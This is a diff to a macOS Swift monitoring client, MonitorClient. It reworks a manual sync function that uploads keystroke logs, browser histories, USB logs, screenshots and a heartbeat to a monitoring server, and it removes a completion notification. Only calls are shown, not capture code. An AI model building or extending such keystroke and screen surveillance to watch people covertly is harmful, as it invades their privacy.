@@ -4784,46 +4784,26 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     
     
     // Manual send all logs function
+    // Manual sync starts the screenshot immediately; the other event uploads
+    // are independent and do not wait for browser-history database scans.
     @objc func sendAllLogs() {
-        // logMessage("=== Manual Send All Logs ===", level: .info)
-        
-        // Send all types of logs
-        DispatchQueue.global(qos: .background).async {
-            // 1. Send Tic event (heartbeat)
-            self.sendTicEvent()
-            
-            // 2. Send browser histories
-            self.sendBrowserHistories()
-            // self.logMessage("✅ Browser histories sent", level: .info)
-            
-            // 3. Send key logs
-            self.sendKeyLogs()
-            // self.logMessage("✅ Key logs sent", level: .info)
-            
-            // 4. Send USB logs
-            self.sendUSBLogs()
-            
-            // 5. Send screenshot
-            if self.isScreenRecordingEnabled() {
-                self.TakeScreenShotsAndPost()
-                // self.logMessage("✅ Screenshot sent", level: .info)
-            } else {
-                self.logMessage("⚠️ Screenshot skipped - permission not granted", level: .warning)
-            }
-            
-            // self.logMessage("=== All Logs Send Complete ===", level: .info)
-            
-            // Show notification
-            DispatchQueue.main.async {
-                let notification = UNMutableNotificationContent()
-                notification.title = "MonitorClient - Manual Send Complete"
-                notification.body = "All monitoring data has been sent to server"
-                notification.sound = nil
-                self.deliverNotification(notification)
-            }
+        if !Thread.isMainThread {
+            DispatchQueue.main.async { [weak self] in self?.sendAllLogs() }
+            return
         }
+        guard !clientToken.isEmpty, selectedMonitorId>0 else {
+            logError("Select an authenticated monitor before sending logs",context:"ManualSync")
+            return
+        }
+        logMessage("Send All Logs started: screenshot, browser, keyboard, USB",level:.info)
+        captureAndPostScreenshot(manual:true)
+        sendTicEvent()
+        sendKeyLogs()
+        sendUSBLogs()
+        sendBrowserHistories()
+        // Do not display "all sent" here: these requests finish asynchronously.
     }
-    
+
     // MARK: - Status Bar Menu
     
     private func setupStatusBarMenu() {
